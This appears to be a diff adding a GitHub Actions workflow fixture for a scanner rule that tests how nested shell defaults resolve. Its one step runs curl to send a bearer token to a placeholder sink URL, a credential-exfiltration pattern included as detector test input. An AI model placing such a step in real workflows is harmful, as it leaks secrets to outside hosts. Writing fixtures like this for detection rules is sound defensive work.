@@ -1,0 +1,17 @@
+# Rule E must fire ONCE. Defaults NEST: the workflow's defaults.run.shell is python, the job's is
+# bash, and the step names no shell. The INNER (job) default wins, so the body is bash: scanned.
+name: fixture-nested-default
+on: workflow_dispatch
+defaults:
+  run:
+    shell: python
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    defaults:
+      run:
+        shell: bash
+    steps:
+      - name: step under an inner bash default
+        run: |
+          curl --disable --noproxy '*' -sS -H "Authorization: Bearer ${FIXTURE_TOKEN}" "$SINK_URL"
